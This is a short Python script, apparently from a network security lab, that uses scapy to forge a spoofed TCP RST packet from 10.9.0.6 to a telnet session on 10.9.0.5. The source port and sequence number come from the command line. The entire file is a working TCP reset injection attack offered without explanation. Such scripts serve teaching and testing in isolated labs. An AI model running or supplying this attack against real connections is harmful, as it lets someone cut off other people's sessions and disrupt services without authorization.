#!/usr/bin/env python3
from scapy.all import *
import sys
print(sys.argv)
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=int(sys.argv[1]), dport=23, flags="R", seq=int(sys.argv[2]))
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
